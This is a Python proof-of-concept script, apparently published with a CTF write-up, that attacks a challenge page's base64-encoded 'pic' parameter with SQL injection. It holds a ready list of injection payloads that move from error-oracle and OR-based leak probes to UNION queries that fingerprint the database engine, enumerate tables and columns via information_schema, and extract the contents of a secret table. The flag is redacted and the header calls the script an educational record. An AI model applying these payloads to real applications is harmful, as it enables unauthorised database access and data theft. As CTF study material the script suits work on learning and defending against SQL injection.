#!/usr/bin/env python3
"""Intigriti 0926 challenge PoC — UNION-based SQLi in challenge.php?pic (base64-decoded).
Educational/repro artifact for the CTF write-up. The challenge ended 2026-09-28;
the host is decommissioned, so this is kept as a methodology record, not a live tool.

Usage: python3 ctf-0926-sqli-poc.py
"""
import base64
import urllib.request

TARGET = "https://challenge-0926.challenges.intigriti.io/challenge.php"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/129.0.0.0 Safari/537.36"


def fetch(pic_value: str) -> str:
    """Send pic=<base64(decoded)> and return the response body."""
    b64 = base64.b64encode(pic_value.encode()).decode()
    req = urllib.request.Request(
        f"{TARGET}?pic={b64}", headers={"User-Agent": UA}
    )
    return urllib.request.urlopen(req, timeout=20).read().decode()


def desc(body: str) -> str:
    """Extract the description block from the detail view."""
    marker = '<div class="desc">'
    i = body.find(marker)
    if i < 0:
        return "<no detail view>"
    j = body.find("</div>", i)
    return body[i + len(marker):j].replace("<br>", "\n")


# The challenge is CLOSED (ended 2026-09-28 23:59 UTC) - this script is published
# for educational purposes with the write-up. The flag value is redacted in output.
PROBES = [
    ("baseline (unknown critter)", "zzz"),
    ("error oracle: unbalanced quote", "abc'd"),
    ("double quote is fine", 'abc"d'),
    ("escaped-pair survives", "a''b"),
    ("truthy-OR leak (all rows)", "1'||'2"),
    ("engine fingerprint", "x' UNION SELECT version()-- "),
    ("schema enumeration", "x' UNION SELECT group_concat(table_name) FROM information_schema.tables-- "),
    ("vault columns", "x' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='secret_vault'-- "),
    ("the extraction", "x' UNION SELECT group_concat(note) FROM secret_vault-- "),
]

for label, payload in PROBES:
    print(f"=== {label}\n    payload: {payload!r}")
    try:
        body = fetch(payload)
        out = desc(body)
        # redact flag in printout; it was captured during the live window
        if "INTIGRITI{" in out:
            out = out.split("INTIGRITI{")[0] + "INTIGRITI{...redacted, captured during live window...}"
        print(f"    -> {out[:200]}")
    except Exception as e:
        print(f"    -> ERROR: {e}")
    print()